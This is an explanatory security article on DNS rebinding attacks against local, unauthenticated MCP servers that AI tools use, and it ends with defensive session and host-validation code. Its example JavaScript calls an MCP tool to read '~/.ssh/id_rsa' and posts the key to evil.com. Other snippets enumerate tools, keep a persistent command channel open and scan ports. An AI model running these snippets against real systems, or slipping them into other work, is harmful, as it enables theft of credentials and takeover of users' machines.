# Security Analysis: DNS Rebinding Attack Vectors in MCP

## Overview
DNS rebinding attacks allow remote websites to bypass same-origin policy and interact with local MCP servers. This is particularly dangerous because MCP servers often run locally without authentication, trusting the local environment.

## DNS Rebinding Attack Flow

```
[Classic DNS Rebinding Against Local MCP Server]

Step 1: Initial Page Load
┌─────────────┐         ┌──────────────┐         ┌──────────────┐
│   Browser   │ ──────> │ Attacker.com │ ──────> │     DNS      │
│             │         │ A: 1.2.3.4   │         │              │
└─────────────┘         └──────────────┘         └──────────────┘
       ↓
Load malicious JavaScript

Step 2: DNS Cache Expires (TTL=0)
┌─────────────┐                                  ┌──────────────┐
│   Browser   │ -------------------------------->│     DNS      │
│             │  "What's attacker.com now?"      │              │
└─────────────┘                                  └──────────────┘
                                                         ↓
                                                  "127.0.0.1" ←── Rebound!

Step 3: Attack Local MCP
┌─────────────┐         ┌──────────────┐
│   Browser   │ ──────> │ Local MCP    │
│             │  XHR    │ 127.0.0.1:3000│
└─────────────┘         └──────────────┘
       ↓
JavaScript from attacker.com
now accesses local MCP server!
```

## MCP-Specific DNS Rebinding Risks

### 1. Unauthenticated Local Servers
```
Typical MCP Setup:
- Runs on localhost:3000
- No authentication required
- Trusts local connections
- Full tool access

Perfect DNS rebinding target!
```

### 2. Weak Session Validation
```javascript
// Vulnerable MCP Implementation
if (request.origin === "localhost" || 
    request.origin === "127.0.0.1") {
    // Allow all requests - NO SESSION VALIDATION!
    processRequest(request);
}

// DNS rebinding bypasses this check!
```

### 3. Persistent Connections via SSE
```
DNS Rebinding + SSE = Persistent backdoor

1. Establish SSE connection during rebinding
2. Connection remains open after DNS changes back
3. Attacker maintains real-time access to local MCP
4. Can inject commands indefinitely
```

## Attack Scenarios

### Scenario 1: Tool Invocation
```javascript
// Malicious JavaScript after DNS rebinding
fetch('http://attacker.com:3000/mcp', {
    method: 'POST',
    body: JSON.stringify({
        jsonrpc: "2.0",
        method: "tools/call",
        params: {
            name: "execute_command",
            arguments: {
                command: "cat ~/.ssh/id_rsa"
            }
        }
    })
})
.then(response => response.json())
.then(data => {
    // Send stolen SSH key to attacker
    fetch('https://evil.com/steal', {
        method: 'POST',
        body: data.result
    });
});
```

### Scenario 2: Resource Enumeration
```javascript
// Discover what tools the MCP server exposes
async function enumarateMCP() {
    // List tools
    const tools = await fetch('http://attacker.com:3000/mcp', {
        method: 'POST',
        body: JSON.stringify({
            jsonrpc: "2.0",
            method: "tools/list"
        })
    });
    
    // List resources
    const resources = await fetch('http://attacker.com:3000/mcp', {
        method: 'POST',
        body: JSON.stringify({
            jsonrpc: "2.0",
            method: "resources/list"
        })
    });
    
    // Now attacker knows full capability set
}
```

### Scenario 3: Persistent Backdoor
```javascript
// Establish SSE connection that survives DNS changes
const eventSource = new EventSource('http://attacker.com:3000/mcp/events');

eventSource.onmessage = function(event) {
    // Receive commands from attacker
    const command = JSON.parse(event.data);
    executeMCPCommand(command);
};

// Connection persists even after DNS rebinding expires!
```

## Why Session Validation Doesn't Help (If Weak)

### Predictable Session IDs
```
Weak implementations:
- session_id = timestamp
- session_id = incrementing counter
- session_id = MD5(username + date)

Attacker can:
1. Predict valid session IDs
2. Brute force current sessions
3. Replay observed sessions
```

### No Origin Binding
```
Even with session IDs, if not bound to origin:
1. Legitimate user creates session from localhost
2. DNS rebinding occurs
3. Attacker reuses same session ID
4. Server accepts because session is "valid"
```

## Advanced DNS Rebinding Techniques

### 1. Multiple Rebinding
```
attacker.com → 1.2.3.4 → 127.0.0.1 → 192.168.1.100
                               ↓              ↓
                          Local MCP    Internal network
```

### 2. Port Scanning via Rebinding
```javascript
// Scan common MCP ports
for (let port = 3000; port <= 3100; port++) {
    try {
        await fetch(`http://attacker.com:${port}/mcp`);
        console.log(`MCP found on port ${port}`);
    } catch(e) {
        // Port closed or not MCP
    }
}
```

### 3. Time-Based Rebinding
```
TTL=5s:  attacker.com → 1.2.3.4
TTL=0s:  attacker.com → 127.0.0.1 (30 second window)
TTL=5s:  attacker.com → 1.2.3.4

Automated attack during rebinding window
```

## Detection Challenges

1. **Looks Like Normal Traffic**: Requests come from user's browser
2. **No Network Anomaly**: Traffic is to localhost
3. **Valid HTTP**: Proper requests to MCP endpoints
4. **User Initiated**: User visited website voluntarily

## Defensive Requirements

### Strong Session Management
```python
def create_session():
    return {
        'id': secrets.token_urlsafe(32),  # Cryptographically secure
        'origin': request.origin,         # Bind to origin
        'created': time.time(),           # Timestamp
        'ip': request.remote_addr        # Bind to IP
    }

def validate_session(session_id, request):
    session = get_session(session_id)
    if not session:
        return False
    if session['origin'] != request.origin:
        return False  # Origin mismatch!
    if session['ip'] != request.remote_addr:
        return False  # IP changed!
    return True
```

### Additional Protections
1. **Host Header Validation**: Reject non-localhost hosts
2. **CORS Headers**: Strict origin policies
3. **HTTPS Only**: Even for localhost
4. **Token Binding**: Bind sessions to TLS client certs
5. **Rate Limiting**: Prevent brute force

## The Core Problem

MCP servers trust local connections implicitly. DNS rebinding breaks this trust model by making remote sites appear local. Without proper session validation and origin checking, local MCP servers are sitting ducks.

Financial institutions should be especially concerned - DNS rebinding could give attackers access to internal trading systems, customer data, and financial tools through compromised MCP servers!